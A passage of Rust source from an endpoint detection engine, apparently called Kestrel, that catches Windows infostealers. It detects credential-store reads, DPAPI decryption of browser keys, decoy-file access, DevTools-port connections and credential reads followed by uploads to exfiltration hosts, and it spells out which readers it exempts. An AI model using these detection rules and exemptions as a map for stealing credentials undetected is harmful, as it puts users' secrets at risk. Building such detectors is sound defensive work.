        let store = match match_normalized(&norm) {
            Some(s) => s,
            // Fix round 2026-10-25 (corpus `evasion_short_name_paths`): an
            // 8.3 short path (`USERDA~1\Default\LOGIND~1`) is the store it
            // abbreviates.
            None => match crate::paths::match_short_names(&norm) {
                Some((s, long)) => {
                    norm = long;
                    s
                }
                None => return,
            },
        };
        // The process's own profile key (Electron / WebView2 app) is not a
        // credential read; a foreign `Local State` stays one.
        if own_ls && store.app == "Chromium-based browser" {
            return;
        }
        // FP-13: opening a store folder (enumeration) is not a read.
        if op == FileOp::Open && crate::paths::store_container_path(&norm) {
            return;
        }
        let relevant = match op {
            FileOp::Open | FileOp::Read => true,
            FileOp::Write | FileOp::Create => {
                store.owner == crate::paths::OwnerApp::Discord
                    && store.noun.starts_with("client core")
            }
            FileOp::Rename | FileOp::Delete => false,
        };
        if !relevant || self.is_agent_owned(&e.guid) || e.pid == 4 || e.pid == 0 {
            return;
        }
        let proc_ = self.proc_info(e);
        // Fix round 2026-10-25 (FP-01, PID reuse in pre-1.1.6 agents): a
        // process cannot open files after it exited. A read stamped more than
        // 5 s after the process's stop belongs to another process that
        // reused the PID; it is not attributed to this one.
        if proc_.exit_ts.is_some_and(|x| e.ts > x + 5_000) {
            return;
        }
        // No image at all: a process that predates the agent and that Windows
        // will not let it open (protected processes such as token-broker
        // hosts; lab VM). New processes always arrive with their image (the
        // translator holds their events until ProcessStart), so this is not a
        // blind spot for malware started after the agent; the read stays in
        // telemetry.
        if proc_.image.is_empty() {
            return;
        }
        // Owner's PC triage 2026-10-22: the store must sit where the real
        // one lives (a real profile root, not a simulated profile in Temp,
        // an MSIX app's own LocalCache copy or a mangled command line).
        if !crate::paths::store_location_real(
            &norm,
            &store,
            &proc_.image,
            self.system_drive,
            self.tampered.contains(&proc_.guid),
        ) {
            return;
        }
        // Triage item 8: Git for Windows / OpenSSH / PuTTY clients in their
        // admin-only install folders own the SSH key stores.
        if crate::legit_apps::ssh_client_owner(
            &proc_,
            &store,
            self.system_drive,
            self.tampered.contains(&proc_.guid),
        ) {
            return;
        }
        // Soak 2026-10-21: the browser's own signed install tree (updater
        // helpers such as Chrome's os_update_handler.exe) owns its stores;
        // Microsoft-signed Program Files apps are WAM clients of the token
        // broker cache (not when running a script).
        let tampered = self.tampered.contains(&proc_.guid);
        let sd = self.system_drive;
        // Red-team round 2: a genuine browser launched by an untrusted
        // process (a possible early-bird injection) owns only its own
        // vendor's stores, not every browser's.
        let foreign_for_launched = matches!(
            store.owner,
            crate::paths::OwnerApp::Chromium | crate::paths::OwnerApp::Firefox
        ) && identity::genuine_browser(&proc_, sd, tampered)
            && !Self::same_vendor_store(&proc_.image, &norm)
            && self.launched_by_untrusted(&proc_);
        // Review 1.1.7 M3: never for an Electron owner that may be running
        // attacker code (script / eval / inspector argument, untrusted
        // launcher).
        let electron_hijack = self.electron_hijack_suspected(&proc_);
        if (is_trusted_owner(&proc_, &store, &norm, sd, tampered)
            && !foreign_for_launched
            && !electron_hijack)
            || (crate::paths::own_embedded_profile(&proc_, &store, &norm, sd, tampered)
                && !electron_hijack)
            || crate::legit_apps::browser_store_owner(&proc_, store.app, sd, tampered).is_some()
            || crate::legit_apps::bundled_cli_python(&proc_, store.app, sd, tampered)
            || benign_reader_for(&proc_, &store, &norm, sd, tampered).is_some()
            || self.system_reader_ok(&proc_, &store)
        {
            return;
        }
        if self.excluded(&proc_, ST01, e.ts) || self.iocs.allowed_process(&proc_) {
            return;
        }
        let benign =
            if crate::legit_apps::wam_client_reader(&proc_, store.app, self.system_drive, tampered)
            {
                BenignRead::Wam
            } else if crate::legit_apps::dev_tool_reader(
                &proc_,
                store.app,
                self.system_drive,
                tampered,
            ) {
                BenignRead::DevTool
            } else if crate::legit_apps::ms_wam_reader_per_user(
                &proc_,
                store.app,
                self.system_drive,
                tampered,
            ) {
                BenignRead::WamPerUser
            } else if crate::legit_apps::vendor_config_reader(
                &proc_,
                &store,
                self.system_drive,
                tampered,
            ) {
                BenignRead::VendorConfig
            } else if crate::paths::own_folder_reader(&proc_, &store, &norm, sd, tampered) {
                BenignRead::OwnFolder
            } else {
                BenignRead::No
            };
        self.on_sensitive_read(e, &proc_, &store, op, benign);
    }

    fn on_sensitive_read(
        &mut self,
        e: &Event,
        proc_: &ProcessInfo,
        store: &SensitiveStore,
        op: FileOp,
        benign: BenignRead,
    ) {
        let st = self.state(&proc_.guid, e.ts);
        match benign {
            BenignRead::Wam => st.wam_cred = true,
            BenignRead::DevTool => st.dev_tool_cred = true,
            BenignRead::WamPerUser => st.ms_wam_cred = true,
            BenignRead::VendorConfig => st.vendor_cfg_cred = true,
            BenignRead::OwnFolder => st.own_folder_cred = true,
            BenignRead::No => {
                st.non_wam_cred = true;
                st.file_cred = true;
            }
        }
        match (
            crate::legit_apps::cloud_provider(store.app),
            st.cloud_provider,
        ) {
            (Some(p), None) => st.cloud_provider = Some(p),
            (Some(p), Some(q)) if p == q => {}
            _ => st.non_provider_cred = true,
        }
        st.add_category(store.category, e.ts);
        st.touch(store.app, store.noun);
        st.add_evidence(e);
        if st.first_cred_ts.is_none() {
            st.first_cred_ts = Some(e.ts);
        }
        st.last_cred_ts = Some(e.ts);
        let ncat = st.categories_within(e.ts, ST02_WINDOW_MS);
        let first = st.first_cred_ts.unwrap_or(e.ts);
        let phrase = stores_phrase(&st.touched);

        let untrusted = is_untrusted_location_or_signature(proc_);
        let kill_at_expiry = untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable();
        let verb = if op == FileOp::Write || op == FileOp::Create {
            "modified"
        } else {
            "read"
        };
        let mut hit = Hit::new(
            ST01,
            &proc_.guid,
            if untrusted {
                Severity::High
            } else {
                Severity::Medium
            },
            format!(
                "{} {verb} {} {}, a store only {} itself should open",
                describe(proc_),
                store.app,
                store.noun,
                store.app
            ),
        );
        match benign {
            BenignRead::Wam => {
                // A Microsoft-signed WAM client reading the token broker cache:
                // recorded (ST-02 / ST-04 correlation) and alerted Low / Audit,
                // never suspended.
                hit.severity = Severity::Low;
                hit.mode_override = Some(RuleMode::Audit);
                hit.summary.push_str(" (Microsoft-signed app reading the Windows sign-in (WAM) token cache, which WAM clients do; alert only)");
            }
            BenignRead::DevTool => {
                // Owner's PC 2026-10-22 (Docker Desktop): a signed developer
                // tool installed under Program Files reading a developer-tool
                // credential store: recorded and alerted Low / Audit.
                hit.severity = Severity::Low;
                hit.mode_override = Some(RuleMode::Audit);
                hit.summary.push_str(&format!(
                    " (validly signed {} application installed under Program Files reading a developer-tool credential store, which developer tools such as Docker Desktop, kubectl, Lens or cloud CLIs do; alert only)",
                    proc_.signer.as_deref().unwrap_or("").trim()
                ));
            }
            BenignRead::WamPerUser => {
                // Triage item 6: per-user VS Code. Recorded; ST-04 is Low
                // Audit only towards Microsoft's own endpoints.
                hit.severity = Severity::Low;
                hit.mode_override = Some(RuleMode::Audit);
                hit.summary.push_str(" (Microsoft-signed app installed in the user profile reading the Windows sign-in (WAM) token cache, which WAM clients do; alert only, but a later send to anything other than Microsoft's own sign-in / telemetry endpoints gets the full response)");
            }
            BenignRead::VendorConfig => {
                // Triage item 9: GPU / overlay / launcher services scan
                // Steam's client configuration.
                hit.severity = Severity::Low;
                hit.mode_override = Some(RuleMode::Audit);
                hit.summary.push_str(&format!(
                    " (validly signed {} service installed under Program Files reading Steam's client configuration, which GPU, overlay and game-library tools do; the Steam Guard and login token files are not covered; alert only)",
                    proc_.signer.as_deref().unwrap_or("").trim()
                ));
            }
            BenignRead::OwnFolder => {
                hit.severity = Severity::Low;
                hit.mode_override = Some(RuleMode::Audit);
                hit.summary.push_str(&format!(
                    " (validly signed \"{}\" image in the store's own application folder; its publisher is not in Kestrel's signer table, so this is recorded and a later send is judged by destination; alert only)",
                    proc_.signer.as_deref().unwrap_or("").trim()
                ));
            }
            BenignRead::No => {
                hit.suspend = true;
                hit.kill_at_expiry = kill_at_expiry;
            }
        }
        self.emit(e, hit);

        if ncat >= ST02_MIN_CATEGORIES {
            let mut hit = Hit::new(
                ST02,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} collected {} — {ncat} kinds of secrets within {}",
                    describe(proc_),
                    phrase,
                    fmt_secs(e.ts - first)
                ),
            );
            hit.actions.push(kill(proc_, true));
            if proc_.path_class.is_user_writable() && !proc_.image.is_empty() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: None,
                });
                hit.actions.push(quarantine(proc_));
            }
            self.emit(e, hit);
        }
        if benign == BenignRead::No {
            if let Some(root) =
                self.record_tree_read(proc_, store.app, store.noun, store.category, e.ts)
            {
                self.check_tree_st02(e, &root);
            }
        }
    }

    fn check_canary(&mut self, e: &Event, dl: &str, op: FileOp) -> bool {
        let (armed_hit, conditional_hit) = match self.canaries.lock() {
            Ok(c) => (
                c.armed.iter().any(|a| {
                    dl == a
                        || (dl.starts_with(a.as_str())
                            && dl.as_bytes().get(a.len()) == Some(&b'\\'))
                }),
                c.conditional.iter().any(|a| dl == a),
            ),
            Err(_) => (false, false),
        };
        let writes = matches!(op, FileOp::Write | FileOp::Create);
        // Only the agent process itself plants decoys.
        if conditional_hit && writes && self.is_agent_guid(&e.guid) {
            self.arm_canary(dl);
            return true;
        }
        if !armed_hit {
            return false;
        }
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return true;
        }
        let proc_ = self.proc_info(e);
        if is_canary_ignored_reader(&proc_, self.table.parent_of(&proc_)) {
            return true;
        }
        // A real program writing a conditional decoy path (e.g. `aws configure`) replaced the decoy.
        let is_conditional_path = is_conditional_canary(dl);
        if is_conditional_path && writes {
            self.disarm_canary(dl);
            return false;
        }
        // Lab FP 2026-10-21: only secret material fires. Directory listings,
        // attribute queries and incidental profile files (profile pictures,
        // Preferences, icons) are what browser / password-manager import
        // scans, backups and indexers touch.
        if !canary::is_decoy_secret(dl) {
            return true;
        }
        let store = match_normalized(dl);
        let what = store
            .as_ref()
            .map(|s| format!("{} {}", s.app, s.noun))
            .unwrap_or_else(|| "credentials".into());
        let file = crate::paths::file_name(dl).to_string();
        // A genuine browser / password manager (Program Files on the system
        // volume, valid signature by the exact vendor, no remote-control /
        // dev switches, never injected into) importing from "another
        // browser": Audit only. Nothing else is exempt (review 2026-10-21).
        let tampered = self.tampered.contains(&proc_.guid);
        if let Some(app) = crate::legit_apps::importer(&proc_, self.system_drive, tampered) {
            let mut hit = Hit::new(
                ST16,
                &proc_.guid,
                Severity::Medium,
                format!(
                    "{} (validly signed {} {}) opened \"{file}\" — decoy {what} planted by Kestrel. Browsers and password managers that import data from other browsers do this, so Kestrel did not act; if nobody ran an import, check {} for injected code",
                    describe(&proc_),
                    app.vendor,
                    app.name,
                    app.name
                ),
            );
            hit.strong = false;
            hit.mode_override = Some(RuleMode::Audit);
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
            return true;
        }
        // Another browser-named owner of the store (a fork not in the
        // known-app table): only outside user-writable locations (a signed
        // browser binary copied to AppData is not one), never at a known
        // app's location with the wrong signer, never remote-controlled.
        let owner_read = store.as_ref().is_some_and(|s| is_trusted_owner(&proc_, s, dl, self.system_drive, self.tampered.contains(&proc_.guid)))
            && !self.electron_hijack_suspected(&proc_)
            // Re-review N4: a positive list; `C:\<new folder>` (Other) is
            // user-creatable and never counts.
            && matches!(
                proc_.path_class,
                PathClass::ProgramFiles | PathClass::System | PathClass::Windows
            )
            && crate::legit_apps::app_at_location(&proc_.image, self.system_drive).is_none()
            && crate::legit_apps::remote_control_switch(&proc_.cmdline, None).is_none()
            && !tampered;
        let mut hit = Hit::new(
            ST16,
            &proc_.guid,
            if owner_read {
                Severity::High
            } else {
                Severity::Critical
            },
            format!(
                "{} opened \"{file}\" — decoy {what} planted by Kestrel in a browser profile no real user data lives in. Stealers read these files; a browser or password manager importing data from other browsers can also open them",
                describe(&proc_)
            ),
        );
        if owner_read {
            // The legitimate owner touching the decoy suggests a profile-name collision or
            // code injected into the browser; alert without killing the user's browser.
            hit.summary
                .push_str(" (reader is the store's own application: check for injection into it)");
            hit.strong = false;
        } else {
            // Protect: stop the reader and cut its network; isolate the whole
            // host only for an untrusted (unsigned / invalid / unknown)
            // image running from a user-writable location (M11).
            hit.actions.push(kill(&proc_, true));
            if !proc_.image.is_empty() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: Some(BLOCK_TTL_SECS),
                });
            }
            hit.actions.push(quarantine(&proc_));
            if untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable() {
                hit.actions.push(ResponseAction::IsolateHost {
                    allow_ips: self.host.server_ips.clone(),
                });
            }
        }
        if let Some(s) = &store {
            let st = self.state(&proc_.guid, e.ts);
            st.touch(s.app, "decoy");
        }
        self.state(&proc_.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
        true
    }

    // ------------------------------------------------------------------
    // DPAPI (ST-03)
    // ------------------------------------------------------------------

    fn on_dpapi(&mut self, e: &Event, description: &str) {
        let Some(browser) = dpapi_browser(description) else {
            return;
        };
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let proc_ = self.proc_info(e);
        let name = file_name_lower(&proc_.image);
        let tampered = self.tampered.contains(&proc_.guid);
        let sd = self.system_drive;
        // Fix round 2026-10-25: a genuine browser (identity, not name); a
        // browser launched by an untrusted process only for its own key.
        let own_key = normalize_path(&proc_.image).contains(&browser.to_ascii_lowercase());
        if (identity::genuine_browser(&proc_, sd, tampered)
            && (own_key || !self.launched_by_untrusted(&proc_)))
            || (name == "elevation_service.exe" && identity::genuine(&proc_, sd, tampered))
        {
            return;
        }
        if crate::legit_apps::browser_store_owner(&proc_, browser, self.system_drive, tampered)
            .is_some()
        {
            return;
        }
        let pseudo = SensitiveStore {
            category: DataCategory::BrowserMasterKey,
            owner: crate::paths::OwnerApp::Chromium,
            app: browser,
            noun: "DPAPI-protected secrets",
            owners: &[],
        };
        if benign_reader_for(&proc_, &pseudo, "", sd, tampered).is_some()
            || self.excluded(&proc_, ST03, e.ts)
            || self.iocs.allowed_process(&proc_)
        {
            return;
        }
        // Fix round 2026-10-25: anything foreign read by the process or its
        // untrusted tree in the last 10 minutes (a browser / wallet store,
        // another profile's `Local State`) rules out an own-key decrypt.
        let recent = |t: TimestampMs| t <= e.ts && e.ts - t <= 10 * 60 * 1000;
        let foreign_self = self
            .states
            .get(&proc_.guid)
            .is_some_and(|s| s.non_wam_cred || s.foreign_ls);
        let foreign_tree = self
            .tree_keys(&proc_.guid)
            .iter()
            .any(|k| self.tree.get(k).is_some_and(|c| recent(c.last_ts)));
        // FP-04 / Xeno with the 2026-10-25 sensor evidence: the "Chromium"
        // decrypt follows a read of the process's own profile `Local State`
        // and nothing foreign: the app's own safeStorage key. Info, Audit,
        // not a credential signal (no ST-02 category, no ST-04).
        let own_evidence = browser == "Chromium"
            && !tampered
            && !foreign_self
            && !foreign_tree
            && self
                .states
                .get(&proc_.guid)
                .and_then(|s| s.own_ls_ts)
                .is_some_and(recent);
        if own_evidence {
            let st = self.state(&proc_.guid, e.ts);
            st.own_app_dpapi = true;
            st.add_evidence(e);
            let mut hit = Hit::new(ST03, &proc_.guid, Severity::Info, format!("{} used Windows DPAPI to decrypt a \"Chromium\" key right after reading its own profile's Local State and no other browser's: the app's own Electron / Chromium safeStorage key", describe(&proc_)));
            hit.mode_override = Some(RuleMode::Audit);
            self.emit(e, hit);
            return;
        }
        // Lab 2026-10-21: Electron apps (VS Code, …) unprotect their own
        // os_crypt / safeStorage key with the description "Chromium". A
        // validly signed, non-browser, non-script-host image under Program
        // Files / WindowsApps that has not read any other credential store:
        // Low / Audit, still recorded (ST-04 then stays Audit too).
        // FP-04 (fix round 2026-10-25): per-user installs of listed
        // publishers (Discord, VS Code in AppData) are their own apps too;
        // identity replaces "under Program Files", and nothing foreign may
        // have been read by the process or its tree.
        let own_app = browser == "Chromium"
            && identity::genuine(&proc_, sd, tampered)
            && (crate::legit_apps::in_program_files(&proc_.image, sd)
                || identity::publishers_for(&name).next().is_some())
            && !is_browser_image(&name)
            && !is_lolbin(&name)
            && !crate::legit_apps::is_interpreter(&name)
            && !crate::legit_apps::is_remote_controlled(&proc_.cmdline)
            && !foreign_self
            && !foreign_tree;
        let st = self.state(&proc_.guid, e.ts);
        if browser == "Chromium" {
            st.dpapi_chromium = true;
        } else {
            st.dpapi_named = true;
        }
        st.add_category(DataCategory::BrowserMasterKey, e.ts);
        st.touch(browser, "DPAPI-protected secrets");
        st.add_evidence(e);
        st.last_dpapi_ts = Some(e.ts);
        st.non_provider_cred = true;
        if own_app {
            st.own_app_dpapi = true;
        } else {
            st.non_wam_cred = true;
        }
        if st.first_cred_ts.is_none() {
            st.first_cred_ts = Some(e.ts);
        }
        let ncat = st.categories_within(e.ts, ST02_WINDOW_MS);
        let first = st.first_cred_ts.unwrap_or(e.ts);
        let phrase = stores_phrase(&st.touched);
        let kill_at_expiry = untrusted_sig(proc_.signed) && proc_.path_class.is_user_writable();
        let mut hit = Hit::new(ST03, &proc_.guid, Severity::High, format!("{} used Windows DPAPI to decrypt {browser} secrets (\"{}\") — only the browser itself should do this", describe(&proc_), truncate(description, 40)));
        if own_app {
            hit.severity = Severity::Low;
            hit.mode_override = Some(RuleMode::Audit);
            hit.summary.push_str(" (description \"Chromium\" from a genuine installed app that read nothing foreign: Electron's own safeStorage key; alert only)");
        } else {
            hit.suspend = true;
            hit.kill_at_expiry = kill_at_expiry;
        }
        self.emit(e, hit);
        if !own_app {
            if let Some(root) = self.record_tree_read(
                &proc_,
                browser,
                "DPAPI-protected secrets",
                DataCategory::BrowserMasterKey,
                e.ts,
            ) {
                self.check_tree_st02(e, &root);
            }
        }
        if ncat >= ST02_MIN_CATEGORIES {
            let mut hit = Hit::new(
                ST02,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} collected {} — {ncat} kinds of secrets within {}",
                    describe(&proc_),
                    phrase,
                    fmt_secs(e.ts - first)
                ),
            );
            hit.actions.push(kill(&proc_, true));
            if proc_.path_class.is_user_writable() {
                hit.actions.push(ResponseAction::BlockImageNetwork {
                    image: proc_.image.clone(),
                    ttl_secs: None,
                });
                hit.actions.push(quarantine(&proc_));
            }
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // network (ST-04, ST-06, ST-13, ST-14, IOC-NET)
    // ------------------------------------------------------------------

    fn domain_owner_ok(&self, p: &ProcessInfo, host: &str) -> bool {
        let name = file_name_lower(&p.image);
        // Fix round 2026-10-25: the domain's own client by identity
        // (corpus `evasion_stolen_cert_named_discord_update`).
        identity::genuine(p, self.system_drive, self.tainted(&p.guid))
            && DOMAIN_OWNERS
                .iter()
                .any(|(d, imgs)| host_matches(host, d) && imgs.contains(&name.as_str()))
    }

    fn exfil_match(&self, host: &str) -> Option<String> {
        let h = host.trim_end_matches('.').to_ascii_lowercase();
        self.exfil_hosts
            .iter()
            .find(|x| host_matches(&h, x))
            .cloned()
    }

    /// Destination block for an IOC hit: per offending image unless the
    /// policy asks for host-wide blocks, always with a TTL, tagged with the
    /// IOC id so the agent can lift it when the IOC is deleted (M10).
    fn ioc_block(&self, ip: &str, p: &ProcessInfo, ioc_id: &str) -> ResponseAction {
        let per_image = !self.policy.ioc_block_host_wide && !p.image.is_empty();
        ResponseAction::BlockDestination {
            ip: ip.to_string(),
            port: None,
            image: per_image.then(|| p.image.clone()),
            ttl_secs: Some(self.policy.ioc_block_ttl_secs.max(60)),
            ioc_id: Some(ioc_id.to_string()).filter(|s| !s.is_empty()),
        }
    }

    fn st14_actions(p: &ProcessInfo, ips: &[String], port: Option<u16>) -> Vec<ResponseAction> {
        if p.path_class.is_user_writable() && !p.image.is_empty() {
            vec![ResponseAction::BlockImageNetwork {
                image: p.image.clone(),
                ttl_secs: None,
            }]
        } else {
            ips.iter()
                .map(|ip| ResponseAction::BlockDestination {
                    ip: ip.clone(),
                    port,
                    image: Some(p.image.clone()).filter(|s| !s.is_empty()),
                    ttl_secs: Some(BLOCK_TTL_SECS),
                    ioc_id: None,
                })
                .collect()
        }
    }

    /// Triage 2026-10-22 item 11: WSL's service resolves (and, with
    /// mirrored / proxy networking, connects) for Linux processes, so the
    /// real requester is invisible. Low, Audit, no action, own dedup key.
    fn st14_wsl(hit: &mut Hit, p: &ProcessInfo, verb: &str, what: &str) {
        hit.severity = Severity::Low;
        hit.mode_override = Some(RuleMode::Audit);
        hit.actions.clear();
        hit.strong = false;
        hit.dedup_key = Some(format!("{ST14}#wsl"));
        hit.summary = format!(
            "{} {verb} {what} on behalf of a process inside WSL (WSL answers DNS and relays traffic for Linux processes, so Kestrel cannot see which one asked); the name is a dead-drop / exfiltration service stealers use, so check what runs inside WSL if this is unexpected",
            short_name(p)
        );
    }

    fn on_net(&mut self, e: &Event, dst_ip: &str, dst_port: u16, dst_host: Option<&str>) {
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let ip_norm = parse_ip(dst_ip)
            .map(|i| i.to_string())
            .unwrap_or_else(|| dst_ip.to_string());
        if self.server_ips.contains(&ip_norm) {
            return;
        }
        let proc_ = self.proc_info(e);
        let host: Option<String> = dst_host.map(|h| h.to_ascii_lowercase()).or_else(|| {
            self.states
                .get(&e.guid)
                .and_then(|s| s.dns.get(&ip_norm).cloned())
        });
        let browser =
            identity::genuine_browser(&proc_, self.system_drive, self.tainted(&proc_.guid));

        // IOCs
        let ioc = self.iocs.by_ip(dst_ip).cloned().or_else(|| {
            host.as_deref()
                .and_then(|h| self.iocs.by_domain(h).cloned())
        });
        if let Some(h) = ioc {
            if h.action == IocAction::Allow {
                return;
            }
            let mut actions = vec![self.ioc_block(&ip_norm, &proc_, &h.id)];
            if !browser {
                actions.push(kill(&proc_, true));
            }
            let dest = host
                .as_ref()
                .map(|h| format!("{ip_norm} ({h})"))
                .unwrap_or_else(|| ip_norm.clone());
            self.emit_ioc(
                e,
                &proc_,
                IOC_NET,
                &h,
                format!(
                    "{} connected to known-bad destination {dest}:{dst_port}",
                    describe(&proc_)
                ),
                actions,
            );
        }

        let external = is_external_ip(dst_ip);
        // ST-06 local CDP client
        if is_loopback_ip(dst_ip)
            && !browser
            && ((9222..=9229).contains(&dst_port) || self.debug_ports.contains_key(&dst_port))
        {
            let mut hit = Hit::new(ST06, &proc_.guid, Severity::High, format!("{} connected to the browser's DevTools debugging port {dst_port} on this machine — it can read every cookie through it", describe(&proc_)));
            hit.actions.push(kill(&proc_, false));
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }

        // ST-14 dead drop / exfil service
        if !browser {
            let by_host = host.as_deref().and_then(|h| {
                self.exfil_match(h)
                    .filter(|_| !self.domain_owner_ok(&proc_, h))
                    .map(|x| (h.to_string(), x))
            });
            let rpc = dst_port == 8545 && external;
            if by_host.is_some() || rpc {
                let what = match &by_host {
                    Some((h, _)) => format!("{h} ({ip_norm}:{dst_port})"),
                    None => format!(
                        "{ip_norm}:8545, a blockchain RPC port used for EtherHiding C2 lookups"
                    ),
                };
                let mut hit = Hit::new(
                    ST14,
                    &proc_.guid,
                    Severity::High,
                    format!(
                        "{} connected to {what} — a dead-drop / exfiltration service stealers use",
                        describe(&proc_)
                    ),
                );
                if crate::legit_apps::wsl_dns_proxy(&proc_, self.system_drive) {
                    Self::st14_wsl(&mut hit, &proc_, "connected to", &what);
                } else {
                    hit.actions = Self::st14_actions(&proc_, std::slice::from_ref(&ip_norm), None);
                }
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if !external {
            return;
        }
        // ST-13 .NET LOLBin making external connections
        if let Some(reason) = self.states.get(&e.guid).and_then(|s| s.st13) {
            let mut hit = Hit::new(ST13, &proc_.guid, Severity::High, format!("{} started {reason} and then connected to {ip_norm}:{dst_port} — typical of a stealer hollowed into a .NET Framework binary", describe(&proc_)));
            hit.actions.push(kill(&proc_, true));
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }

        // ST-04 steal-then-send.
        if browser {
            return;
        }
        self.st04(e, &proc_, ip_norm, dst_port, host);
    }

    /// ST-04 steal-then-send. Fix round 2026-10-25 (corpus finding 5):
    /// the reader is looked up in the sender itself, its parent and every
    /// descendant (any credential read), the sender's untrusted process tree
    /// (a reader up to the first trusted ancestor, siblings and cousins
    /// included, even after it exited: GUID keyed), and for the BITS service
    /// the trees that created a BITS upload job. Reads within 5 minutes, or
    /// within 30 minutes when the connection already sent 64 KB or more.
    /// Readers with non-benign reads win over benign ones (a signed app's
    /// own key no longer shadows its child that read the real stores).
    fn st04(
        &mut self,
        e: &Event,
        proc_: &ProcessInfo,
        ip_norm: String,
        dst_port: u16,
        host: Option<String>,
    ) {
        let (udp, bytes) = match &e.data {
            EventData::NetConnect {
                proto, bytes_sent, ..
            } => (*proto == NetProto::Udp, *bytes_sent),
            _ => (false, None),
        };
        // Xeno (DETECTION-QUALITY.md section 5): one QUIC Initial is a
        // handshake, not an upload; the flow is reported again at 64 KB.
        if udp && dst_port == 443 && bytes.is_some_and(|b| b <= QUIC_INITIAL_MAX_BYTES) {
            return;
        }
        let slow_ok = bytes.is_some_and(|b| b >= ST04_SLOW_MIN_BYTES);
        let ip_s = ip_norm.clone();
        let now = e.ts;
        let in_window = |t: TimestampMs| {
            t <= now && (now - t <= ST04_WINDOW_MS || (slow_ok && now - t <= ST04_SLOW_WINDOW_MS))
        };
        let sender_tainted = self.tainted(&proc_.guid);
        let bits = Self::bits_host(proc_);
        let sender_trusted =
            (Self::system_trusted(proc_) && !sender_tainted) || self.protected(proc_);
        // (guid, non-benign reads, rank: 0 self, 1 parent / descendant, 2 tree / BITS)
        let mut cands: Vec<(ProcessGuid, bool, u8)> = Vec::new();
        let push_state = |st: &HashMap<ProcessGuid, ProcState>,
                          g: &ProcessGuid,
                          rank: u8,
                          cands: &mut Vec<(ProcessGuid, bool, u8)>| {
            if let Some(s) = st.get(g) {
                if let Some(t) = s.cred_ts() {
                    if in_window(t) && !cands.iter().any(|c| &c.0 == g) {
                        cands.push((g.clone(), s.non_wam_cred, rank));
                    }
                }
            }
        };
        push_state(&self.states, &proc_.guid, 0, &mut cands);
        if !sender_trusted {
            if let Some(p) = self.table.parent_of(proc_) {
                let pt = self.tainted(&p.guid);
                if !(Self::system_trusted(p) && !pt)
                    && !identity::genuine_browser(p, self.system_drive, pt)
                {
                    push_state(&self.states, &p.guid, 1, &mut cands);
                }
            }
            // Direct children with any read; deeper descendants only with
            // non-benign reads (an allowance covers the reader and its own
            // vendor's sends, never an unrelated ancestor's traffic).
            for c in self.table.descendants_all(&proc_.guid, 256) {
                let direct = c.parent_guid.as_ref() == Some(&proc_.guid);
                if direct || self.states.get(&c.guid).is_some_and(|s| s.non_wam_cred) {
                    push_state(&self.states, &c.guid, 1, &mut cands);
                }
            }
            for k in self.tree_keys(&proc_.guid) {
                if let Some(c) = self.tree.get(&k) {
                    if c.linkable()
                        && in_window(c.last_ts)
                        && !cands.iter().any(|x| x.0 == c.reader)
                    {
                        cands.push((c.reader.clone(), true, 2));
                    }
                }
            }
        }
        if bits {
            let creators: Vec<ProcessGuid> = self
                .bits_jobs
                .iter()
                .filter(|(t, _)| *t <= now && now - t <= BITS_JOB_TTL_MS)
                .map(|(_, g)| g.clone())
                .collect();
            for g in creators {
                push_state(&self.states, &g, 2, &mut cands);
                for k in self.tree_keys(&g) {
                    if let Some(c) = self.tree.get(&k) {
                        if in_window(c.last_ts) && !cands.iter().any(|x| x.0 == c.reader) {
                            cands.push((c.reader.clone(), true, 2));
                        }
                    }
                }
            }
        }
        // Non-benign readers first, then the closest relative.
        cands.sort_by_key(|c| (!c.1, c.2));
        let Some((rg, _, rank)) = cands.into_iter().next() else {
            return;
        };
        let tree_info = self.tree_keys(&rg).into_iter().find_map(|k| {
            self.tree
                .get(&k)
                .filter(|c| c.reader == rg)
                .map(|c| (c.reader_info.clone(), c.touched.clone(), c.last_ts))
        });
        let rp = self
            .table
            .get(&rg)
            .cloned()
            .or_else(|| tree_info.as_ref().and_then(|t| t.0.clone()))
            .unwrap_or_else(|| {
                if rg == proc_.guid {
                    proc_.clone()
                } else {
                    placeholder(&rg, 0, e.ts)
                }
            });
        let (phrase, delay) = match self.states.get(&rg).filter(|s| !s.touched.is_empty()) {
            Some(st) => (
                stores_phrase(&st.touched),
                fmt_secs(e.ts - st.cred_ts().unwrap_or(e.ts)),
            ),
            None => match &tree_info {
                Some((_, touched, t)) => (stores_phrase(touched), fmt_secs(e.ts - *t)),
                None => ("credential stores".to_string(), String::new()),
            },
        };
        let dest = match &host {
            Some(h) => format!("{ip_norm}:{dst_port} ({h})"),
            None => format!("{ip_norm}:{dst_port}"),
        };
        let sender_is_parent = rg != proc_.guid
            && (rp.parent_guid.as_ref() == Some(&proc_.guid)
                || self
                    .table
                    .parent_of(&rp)
                    .is_some_and(|p| p.guid == proc_.guid));
        let sender_is_child = rg != proc_.guid
            && (proc_.parent_guid.as_ref() == Some(&rg)
                || self.table.parent_of(proc_).is_some_and(|p| p.guid == rg));
        let who = if rg == proc_.guid {
            "then connected to".to_string()
        } else if bits {
            format!(
                "created a BITS upload job, then the BITS service ({}) uploaded to",
                short_name(proc_)
            )
        } else if sender_is_child {
            format!("then its child {} connected to", short_name(proc_))
        } else if sender_is_parent {
            format!("then its parent {} connected to", short_name(proc_))
        } else if rank == 1 {
            format!("then its ancestor {} connected to", short_name(proc_))
        } else {
            format!(
                "then {} in the same untrusted process tree connected to",
                short_name(proc_)
            )
        };
        let mut hit = Hit::new(
            ST04,
            &rg,
            Severity::Critical,
            format!(
                "{} read {phrase}, {who} {dest} {delay} later",
